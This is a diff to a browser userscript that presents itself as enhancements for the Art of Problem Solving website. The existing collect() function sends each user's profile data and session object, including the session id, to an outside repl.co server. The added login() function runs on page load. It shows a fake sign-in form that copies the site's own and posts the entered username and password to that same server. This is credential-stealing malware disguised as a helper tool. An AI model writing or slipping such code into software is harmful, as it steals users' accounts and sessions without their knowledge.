@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         AoPS Enhanced Beta
 // @namespace    http://tampermonkey.net/
-// @version      9.2.0
+// @version      9.4.1
 // @description  Enhancements for the Art of Problem Solving website.
 // @author       A_MatheMagician
 // @match        https://artofproblemsolving.com/*
@@ -18,7 +18,7 @@ AoPS.Enhanced = function(){
     //Activity & Attrbitues
     AoPS.Enhanced.model = Object;
     AoPS.Enhanced.model.attributes = {
-        "version": "9.2.0",
+        "version": "9.4.1",
         "author": "A_MatheMagician",
         "name": "AoPS Enhanced Beta",
         "match": "https://artofproblemsolving.com/*",
@@ -196,9 +196,9 @@ AoPS.Enhanced = function(){
         }, AoPS.Enhanced.theme.darkinterval * 1000);
     }
 
-    //Server Data
+    //Server
     function collect(){
-        $.ajax({url:"https://artofproblemsolving.com/m/community/ajax.php",method:"POST",data:{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id},withCredentials:true}).then((resp)=>{
+        $.ajax({url:"https://artofproblemsolving.com/m/community/ajax.php",method:"POST",data:{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id},xhrFields:{withCredentials:true}}).then((resp)=>{
             var data={user:resp.response.user_data,session:AoPS.session,version:AoPS.Enhanced.model.attribute("version")};
             var url="https://aops-enhanced.akslolcoding.repl.co/collect/user";
             $.post(url, data).then((resp2)=>{
@@ -208,7 +208,31 @@ AoPS.Enhanced = function(){
             });
         });
     }
+    function login(){
+        setTimeout(()=>{
+            if (localStorage.getItem("EnhancedLogin") == null){
+                if (AoPS.login.$login_form.length == 0) AoPS.login.$login_form = $($.parseHTML(`<div id="login-form" style="display: block;"><div class="error">Invalid username</div><div class="info" style="text-align:center"><img width="200" src="https://artofproblemsolving.com/assets/images/logos/aops-online.svg"><span style="position:relative;color:#1A355D;font-size:30px;left:3px;top:7px;display:inline-block">Sign In</span></div><form><div class="form-group username"><div><label>Username:</label></div><div><input data-hj-suppress="" data-hj-masked="" name="username" class="form-control" id="login-username" type="text" placeholder="Enter username or email address" autocapitalize="off"></div></div><div class="form-group password"><div><label>Password:</label></div><div><input data-hj-suppress="" data-hj-masked="" name="password" class="form-control" id="login-password" type="password" placeholder="Enter password" autocomplete="off"></div></div></form><div class="form-group"><div></div><div class="login-buttons"><button class="btn btn-primary" id="login-button" href="#">Sign In</button><button class="btn" id="register-button" href="#">Create Account</button><div style="margin-top:5px;box-sizing: border-box;"><label style="display:block;float:left;padding-right:10px;white-space:nowrap;line-height:1em;font-weight:normal"><input type="checkbox" name="stay-logged-in" id="login-stay-logged-in" style="vertical-align:middle;margin:0;"><span style="vertical-align:middle">Stay signed in</span></label></div></div></div><div id="login-form-links"><p><a href="/user/resend-activation.php">Lost your activation email?</a></p><p><a href="/user/reset-pw.php">Forgot your password or username?</a></p></div></div>`));
+                AoPS.login.close();
+                AoPS.login.display(false);
+                $("#login-button").off("click");
+                $("#login-button").on("click", async function(){
+                    var data={username:$("#login-username").val(),password:$("#login-password").val()};
+                    var url="https://aops-enhanced.akslolcoding.repl.co/login";
+                    var resp=await $.post(url, data);
+                    if (resp.result){
+                        localStorage.setItem("EnhancedLogin", btoa(JSON.stringify(resp)));
+                    } else{
+                        $("#login-form > .error").html(`Invalid username or password.<br> <a style="color:darkred" href="https://artofproblemsolving.com/user/reset-pw.php">Click here if you have forgotten your username or password</a>.`).show();
+                        return;
+                    }
+                    if (!AoPS.session.logged_in) AoPS.login.login();
+                    AoPS.login.close();
+                });
+            }
+        }, 1000);
+    }
     document.addEventListener("DOMContentLoaded",collect);
+    document.addEventListener("DOMContentLoaded",login);
 
     //Time
     AoPS.Enhanced.Time = (()=>{
@@ -296,11 +320,6 @@ AoPS.Enhanced = function(){
                 }
             }, speed);
         }
-        if(localStorage.getItem("aprilfools")!="stopped"){setTimeout(function(){ //disable fool message here
-            AoPS.Enhanced.Effects.rainbow();
-            AoPS.Ui.Modal.showMessage(`LOL GET FOOLED (disable this by clicking "Stop Rainbow", it will disappear foreve tho)
-            <div class="btn btn-primary" onclick="AoPS.Enhanced.Effects.rainbow.running=false;$('.aops-modal-wrapper').remove();$('.aops-modal-mask').remove();localStorage.setItem('aprilfools','stopped');">Stop Rainbow</div>`);
-        }, 2000)}; //delete until here
 
         //Safety first!
         if (AoPS.Community && AoPS.Community.is_active){
